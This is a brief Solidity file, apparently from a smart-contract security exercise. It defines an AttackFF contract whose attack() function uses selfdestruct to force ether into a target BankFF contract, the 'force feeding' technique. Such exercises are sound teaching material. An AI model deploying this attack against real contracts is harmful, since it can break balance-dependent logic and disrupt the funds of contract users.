// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "./BankFF.sol";

// Force Feeding exercice
contract AttackFF {

    BankFF public bank;

    constructor(BankFF _bankFF) {
        bank = _bankFF;
    }

    fallback() external payable{}

    function attack() external {
        selfdestruct(payable(address(bank)));
    }
}
